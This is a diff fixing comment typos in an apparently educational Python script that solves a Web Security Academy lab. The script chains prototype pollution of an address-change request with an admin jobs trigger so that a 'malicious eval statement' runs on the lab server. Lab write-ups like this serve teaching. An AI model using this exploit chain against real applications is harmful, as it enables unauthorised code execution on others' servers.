@@ -36,7 +36,7 @@ def main():
     }
     r2 = s.post(uri, json=data)   
    
-    # We pollute the change-address data with our malicious eval statment
+    # We pollute the change-address data with our malicious eval statement
     uri = f"https://{lab_id}.web-security-academy.net/my-account/change-address"
     data = {"address_line_1":"Wiener HQ",
             "address_line_2":"One Wiener Way",
@@ -50,12 +50,12 @@ def main():
         }
     r3 = s.post(uri, json=data)
     
-    # now we go to the admin page to reterive the jobs csrf token
+    # now we go to the admin page to retrieve the jobs csrf token
     uri = f"https://{lab_id}.web-security-academy.net/admin"
     r3 = s.get(uri)
     admin_token = token_extract(r3.text) # jobs csrf token
 
-    # when we run the jobs, our malicious eval statment runs with it
+    # when we run the jobs, our malicious eval statement runs with it
     uri = f"https://{lab_id}.web-security-academy.net/admin/jobs"
     data = {"csrf":admin_token,
             "sessionId":s.cookies.get_dict()['session'],
